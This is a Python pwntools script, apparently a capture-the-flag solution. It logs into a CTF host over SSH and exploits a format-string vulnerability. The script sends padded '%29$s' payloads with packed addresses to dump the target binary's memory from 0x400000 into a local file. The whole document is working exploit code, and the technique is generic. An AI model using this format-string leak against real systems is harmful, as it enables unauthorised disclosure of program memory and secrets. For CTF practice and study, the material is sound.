from pwn import *
import struct

def pad(n, s):
    diff = n - len(s)
    idx = 0
    ss = s

    zo = 0
    c = 'A'

    while idx < diff:
        ss += c
        idx += 1
        zo += 1
        if zo == 4:
            c = chr(ord(c) + 1)
            zo = 0
    return ss

def dump(sh, adr, frmt='p'):
    raw_adr = struct.pack("<Q", adr)
    if "\n" in raw_adr:
        sh.sendline("bullshitEOF_espr")
    else:
        leak_part = ('|%29${}|').format(frmt)
        out = pad(128, leak_part) +"EOF_espr" + raw_adr
        # print(">> sending fs: " + out)
        sh.sendline(out)
        # print(">> sended.")
    # rcv = sh.recvuntil("EOF_espr")
    # print(">> recu: " + rcv)
    rcv = sh.recvuntil("EOF_espr")
    # print(">> recu: " + rcv)

    if "\n" in raw_adr:
        return ""
    return rcv.split('|')[1]

def leak_addr(sh, adr, f):
    print "[*] leak 0x{:08x}".format(adr)

    sh.recvuntil("? ")
    sh.recvline()

    leak = dump(sh, adr, 's') + "\x00"
    adr += len(leak)
    # print("  --> {}".format(len(leak)))
    # print("  --> {}".format(repr(leak)))
    f.write(leak)
    f.flush()

    sh.recvuntil("]")
    sh.recvline()
    sh.sendline('y')
    sh.recvuntil("y")
    # sh.recvline()
    
    # print("\n")
    # sh.close()
    return len(leak)

def leak(sh):
    adr = 0x400000
    with open('dump.raw', 'w') as f:
        while adr < 0x400000 + 17200:
            off = leak_addr(sh, adr, f)
            adr += off

if __name__ == '__main__':
    if os.getenv("DEV") == "1":
        host = "localhost"
    else:
        host = "john-cena.ctf.insecurity-insa.fr"

    s = ssh("user", host, port=2229, keyfile="./keys/id_rsa")
    sh = s.shell(tty=False)
    sh.recvline()
    leak(sh)
    # with open('dump.raw', 'w') as f:
    #     leak_addr(sh, 0x00404125, f)
